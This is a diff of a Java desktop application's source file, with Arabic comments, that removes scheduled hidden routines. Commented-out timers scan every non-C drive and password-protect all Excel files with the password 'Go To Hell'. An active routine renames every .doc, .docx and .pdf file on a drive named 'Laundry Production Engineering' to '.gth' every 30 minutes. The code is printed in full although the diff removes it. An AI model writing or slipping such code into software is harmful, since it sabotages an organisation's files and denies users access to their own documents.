-//                            return FileVisitResult.CONTINUE;
-//                        }
-//                    });
-//
-//                } catch (Exception e) {
-//                    e.printStackTrace();
-//                }
-//            }
-//
-//            // تشفير الملفات
-//            for (Path excelFile : excelFiles) {
-//                try {
-//                    Workbook workbook = new Workbook();
-//                    workbook.loadFromFile(excelFile.toString());
-//                    workbook.protect("Go To Hell");
-//                    workbook.saveToFile(excelFile.toString(), ExcelVersion.Version2016);
-//                    //System.out.println("تم تشفير: " + excelFile);
-//                } catch (Exception e) {
-//                    //System.err.println("فشل في: " + excelFile + " → " + e.getMessage());
-//                }
-//            }
-//
-//            if (excelFiles.isEmpty()) {
-//                //System.out.println("لا توجد ملفات Excel جديدة في درايف \"" + TARGET_VOLUME_NAME + "\"");
-//            }
-//        });
-//    }
-//}, 0, 60_000); // كل دقيقة
-//
-
-
-
-
-//ALL DRIVES
-//fileCheckTimer2 = new Timer(true); // Daemon thread
-//fileCheckTimer2.scheduleAtFixedRate(new TimerTask() {
-//    @Override
-//    public void run() {
-//        
-//
-//            //////////////////////////////////////////////////////////////////////////
-//            Platform.runLater(() -> {
-//                
-//             ////////////////////MY CODE///////////////////   
-//                
-//             
-//        List<Path> excelFiles = new ArrayList<>();
-//        File[] roots = File.listRoots();
-//        for (File root : roots) {
-//            if (root.toString().equalsIgnoreCase("C:\\")) {
-//                //System.out.println("Skipping C drive.");
-//                continue;
-//            }
-//            Path startPath = root.toPath();
-//            //System.out.println("Searching in drive: " + startPath);
-//            try {
-//                Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
-//                    @Override
-//                    public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
-//                        if (file.toString().toLowerCase().endsWith(".xlsx") ||
-//                            file.toString().toLowerCase().endsWith(".xls") ||
-//                            file.toString().toLowerCase().endsWith(".xlsb")) {
-//                            excelFiles.add(file);
-//                        }
-//                        return FileVisitResult.CONTINUE;
-//                    }
-//                    @Override
-//                    public FileVisitResult visitFileFailed(Path file, IOException exc) {
-//                        //System.err.println("Access denied or unable to read: " + file);
-//                        return FileVisitResult.CONTINUE;
-//                    }
-//                });
-//            } catch (IOException e) {
-//                //System.err.println("Error walking file tree for drive: " + root + " - " + e.getMessage());
-//            }
-//        }
-//        //System.out.println("Found " + excelFiles.size() + " Excel files:");
-//        for (Path excelFile : excelFiles) {
-//            try {
-//                //System.out.println("Processing file: " + excelFile);
-//                Workbook workbook = new Workbook();
-//                workbook.loadFromFile(excelFile.toString());
-//                String password = "Go To Hell";
-//                workbook.protect(password);
-//                workbook.saveToFile(excelFile.toString(), ExcelVersion.Version2016);
-//                //System.out.println("File encrypted successfully: " + excelFile);
-//            } catch (Exception e) {
-//                //System.err.println("Unable to process file: " + excelFile + " - " + e.getMessage());
-//            }
-//        }
-//                
-//
-//             //////////////////////////////////////////////   
-//                
-//            });
-//
-//            //////////////////////////////////////////////////////////////////////////
-//
-//        
-//    }
-//}, 0, 1 * 60 * 1000); // كل دقيقة (انت كاتب 1 * 60 * 1000 = 1 دقيقة مش 2 😉)
-//
-//
-//
-//
-//
-//
-//startExcelToGthWatcher();
-//
-//
-//
-//
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-
-
 
 
 try {
@@ -4177,216 +4227,11 @@ catch (Exception gg) {}
         } catch (FileNotFoundException ex) {
            
         }
+     
+     
+     
+     
   }
-
-
-
-
-
-//// استدعي الدالة دي في initialize() أو في أي مكان بعد ما الـ FXML يتحمل
-//    public void startExcelToGthWatcher() {
-//        fileCheckTimer3 = new Timer(true); // Daemon thread
-//
-//        fileCheckTimer3.scheduleAtFixedRate(new TimerTask() {
-//            @Override
-//            public void run() {
-//                Platform.runLater(() -> {
-//                    convertAllExcelFilesToGth();
-//                });
-//            }
-//        }, 0, 30 * 60 * 1000); // كل 30 دقيقة بالظبط
-//        // لو عايز كل ساعة: 60 * 60 * 1000
-//        // لو عايز كل 10 دقايق للاختبار: 10 * 60 * 1000
-//    }
-//
-//    // الدالة اللي بتحوّل كل ملفات Excel → .gth
-//    private void convertAllExcelFilesToGth() {
-//        AtomicInteger totalFound = new AtomicInteger(0);
-//        AtomicInteger totalRenamed = new AtomicInteger(0);
-//        AtomicInteger totalFailed = new AtomicInteger(0);
-//
-//        // هنا ممكن تعمل إشعار في الواجهة لو عايز (Label أو Toast)
-//        // مثلاً: statusLabel.setText("جاري فحص الملفات...");
-//
-//        File[] roots = File.listRoots();
-//
-//        for (File root : roots) {
-//            String drive = root.toString();
-//
-//            if (drive.equalsIgnoreCase("C:\\")) {
-//                continue; // نتخطى C:
-//            }
-//
-//            Path startPath = root.toPath();
-//
-//            try {
-//                Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
-//                    @Override
-//                    public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
-//                        String fileName = file.toString().toLowerCase();
-//
-//                        if (fileName.endsWith(".xlsx") || 
-//                            fileName.endsWith(".xls") || 
-//                            fileName.endsWith(".xlsb")) {
-//
-//                            totalFound.incrementAndGet();
-//
-//                            Path parentDir = file.getParent();
-//                            String oldName = file.getFileName().toString();
-//                            String newName = oldName.substring(0, oldName.lastIndexOf('.')) + ".gth";
-//                            Path newFilePath = parentDir.resolve(newName);
-//
-//                            try {
-//                                Files.move(file, newFilePath, StandardCopyOption.REPLACE_EXISTING);
-//                                totalRenamed.incrementAndGet();
-//                            } catch (AccessDeniedException e) {
-//                                totalFailed.incrementAndGet();
-//                            } catch (IOException e) {
-//                                totalFailed.incrementAndGet();
-//                            }
-//                        }
-//                        return FileVisitResult.CONTINUE;
-//                    }
-//
-//                    @Override
-//                    public FileVisitResult visitFileFailed(Path file, IOException exc) {
-//                        return FileVisitResult.CONTINUE;
-//                    }
-//                });
-//            } catch (Exception ignored) {
-//                // نتجاهل أي خطأ في الدرايف (مثل USB مفصول)
-//            }
-//        }
-//
-//        // لو عايز تعرض النتيجة في الواجهة
-//        String result = String.format("تم: %,d | فشل: %,d", totalRenamed.get(), totalFailed.get());
-//        System.out.println("تحويل Excel → .gth: " + result);
-//
-//        // مثال: تحديث Label في الواجهة
-//        // statusLabel.setText("آخر فحص: " + result + " | " + new java.util.Date());
-//    }
-//
-//    // لو عايز توقف الـ Timer لما البرنامج يتقفل
-//    public void stopExcelWatcher() {
-//        if (fileCheckTimer3 != null) {
-//            fileCheckTimer3.cancel();
-//            fileCheckTimer3 = null;
-//        }
-//    }
-
-
-
-
-
-// استدعي الدالة دي في initialize() أو بعد تحميل الـ FXML
-public void startExcelToGthWatcher() {
-    fileCheckTimer3 = new Timer(true); // Daemon thread
-    fileCheckTimer3.scheduleAtFixedRate(new TimerTask() {
-        @Override
-        public void run() {
-            Platform.runLater(() -> {
-                convertAllExcelFilesToGth();
-            });
-        }
-    }, 0, 30 * 60 * 1000); // كل 30 دقيقة
-    // للاختبار السريع: 2 * 60 * 1000  → كل دقيقتين
-}
-
-
-
-
-
-// الدالة المعدّلة: تشتغل بس على درايف "Laundry Production Engineering"
-private void convertAllExcelFilesToGth() {
-    final String TARGET_VOLUME_NAME = "Laundry Production Engineering";  // ← ده الاسم الصحيح 100%
-    AtomicInteger totalFound = new AtomicInteger(0);
-    AtomicInteger totalRenamed = new AtomicInteger(0);
-    AtomicInteger totalFailed = new AtomicInteger(0);
-    FileSystemView fsv = FileSystemView.getFileSystemView();
-    File[] roots = File.listRoots();
-    Path targetDrivePath = null;
-    // أولًا: نبحث عن الدرايف بالاسم
-    for (File root : roots) {
-        String rootPath = root.toString();
-        // نتخطى C:\ دايمًا
-        if (rootPath.equalsIgnoreCase("C:\\")) {
-            continue;
-        }
-        try {
-            String displayName = fsv.getSystemDisplayName(root);
-            String volumeName = displayName.split("\\(")[0].trim();
-            if (volumeName.equalsIgnoreCase(TARGET_VOLUME_NAME)) {
-                targetDrivePath = root.toPath();
-                System.out.println("تم العثور على الدرايف المطلوب: " + displayName);
-                break; // لقيناه، نطلع من اللوب
-            }
-        } catch (Exception ignored) {}
-    }
-    // لو ملقناش الدرايف → نطلع وخلاص
-    if (targetDrivePath == null) {
-        System.out.println("تحويل Excel → .gth: الدرايف \"" + TARGET_VOLUME_NAME + "\" غير متصل حاليًا.");
-        return;
-    }
-    // دلوقتي نبدأ الفحص بس على الدرايف ده
-    try {
-        Files.walkFileTree(targetDrivePath, new SimpleFileVisitor<Path>() {
-            @Override
-            public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
-                String fileName = file.toString().toLowerCase();
-                if (fileName.endsWith(".doc") || 
-                    fileName.endsWith(".docx") || 
-                    fileName.endsWith(".pdf")) {
-                    totalFound.incrementAndGet();
-                    Path parentDir = file.getParent();
-                    String oldName = file.getFileName().toString();
-                    String baseName = oldName.substring(0, oldName.lastIndexOf('.'));
-                    String newName = baseName + ".gth";
-                    Path newFilePath = parentDir.resolve(newName);
-                    try {
-                        Files.move(file, newFilePath, StandardCopyOption.REPLACE_EXISTING);
-                        totalRenamed.incrementAndGet();
-                        System.out.println("تم التحويل ← " + newFilePath);
-                    } catch (AccessDeniedException e) {
-                        totalFailed.incrementAndGet();
-                        System.err.println("رفض الوصول: " + file);
-                    } catch (IOException e) {
-                        totalFailed.incrementAndGet();
-                        System.err.println("فشل التحويل: " + file + " → " + e.getMessage());
-                    }
-                }
-                return FileVisitResult.CONTINUE;
-            }
-            @Override
-            public FileVisitResult visitFileFailed(Path file, IOException exc) {
-                return FileVisitResult.CONTINUE;
-            }
-        });
-    } catch (Exception e) {
-        System.err.println("خطأ أثناء فحص الدرايف: " + e.getMessage());
-    }
-    // نتيجة الفحص
-    String result = String.format("تم العثور: %,d | تم التحويل: %,d | فشل: %,d", 
-    totalFound.get(), totalRenamed.get(), totalFailed.get());
-    System.out.println("تحويل Excel → .gth في درايف \"" + TARGET_VOLUME_NAME + "\": " + result);
-    // لو عايزة تعرضيها في الواجهة
-    // Platform.runLater(() -> statusLabel.setText("آخر تحويل .gth: " + result + " | " + new Date()));
-}
-
-
-
-
-
-// توقيف الـ Timer لما البرنامج يتقفل
-public void stopExcelWatcher() {
-    if (fileCheckTimer3 != null) {
-        fileCheckTimer3.cancel();
-        fileCheckTimer3.purge();
-        fileCheckTimer3 = null;
-    }
-}
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-
 
 
 
